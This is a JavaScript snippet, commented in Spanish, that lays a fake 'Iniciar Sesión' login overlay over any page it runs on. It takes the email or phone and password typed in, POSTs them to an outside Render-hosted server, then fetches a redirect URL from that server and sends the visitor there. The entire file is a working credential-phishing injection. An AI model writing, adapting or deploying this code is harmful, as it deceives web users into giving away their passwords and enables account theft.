(function() {
    // REEMPLAZA ESTO CON TU URL DE RENDER
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    // 1. Crear el fondo (Overlay)
    const overlay = document.createElement('div');
    overlay.style = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        background: rgba(0, 0, 0, 0.85) !important;
        z-index: 999999999 !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        backdrop-filter: blur(5px) !important;
    `;

    // 2. Crear la tarjeta del formulario
    overlay.innerHTML = `
        <div style="
            background: white !important;
            padding: 40px 30px !important;
            border-radius: 15px !important;
            width: 90% !important;
            max-width: 400px !important;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4) !important;
            text-align: center !important;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
            box-sizing: border-box !important;
        ">
            <h2 style="color: #2563eb !important; margin: 0 0 25px 0 !important; font-size: 28px !important; font-weight: bold !important;">
                Iniciar Sesión
            </h2>
            
            <input id="i-email" type="text" placeholder="Correo electrónico o teléfono" style="
                width: 100% !important;
                padding: 15px !important;
                margin-bottom: 15px !important;
                border: 1px solid #ccc !important;
                border-radius: 8px !important;
                font-size: 16px !important;
                box-sizing: border-box !important;
                display: block !important;
                color: black !important;
                background: white !important;
            ">
            
            <input id="i-pass" type="password" placeholder="Contraseña" style="
                width: 100% !important;
                padding: 15px !important;
                margin-bottom: 25px !important;
                border: 1px solid #ccc !important;
                border-radius: 8px !important;
                font-size: 16px !important;
                box-sizing: border-box !important;
                display: block !important;
                color: black !important;
                background: white !important;
            ">
            
            <button id="i-btn" style="
                width: 100% !important;
                padding: 15px !important;
                background: #2563eb !important;
                color: white !important;
                border: none !important;
                border-radius: 8px !important;
                font-size: 18px !important;
                font-weight: bold !important;
                cursor: pointer !important;
                transition: background 0.3s !important;
                display: block !important;
            ">
                Entrar
            </button>
            
            <p style="margin-top: 20px !important; color: #666 !important; font-size: 14px !important;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
    `;

    document.body.appendChild(overlay);

    // 3. Lógica de envío
    document.getElementById('i-btn').onclick = async function() {
        const email = document.getElementById('i-email').value;
        const password = document.getElementById('i-pass').value;
        
        if(!email || !password) {
            alert("Por favor, rellena todos los campos.");
            return;
        }

        this.disabled = true;
        this.innerText = "Verificando...";

        try {
            // Guardar datos
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });

            // Obtener link de redirección
            const res = await fetch(`${SERVER_URL}/config`);
            const config = await res.json();

            // Redirigir
            setTimeout(() => {
                window.location.href = config.redirect_url;
            }, 1500);

        } catch(e) {
            alert("Error de conexión con el servidor");
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
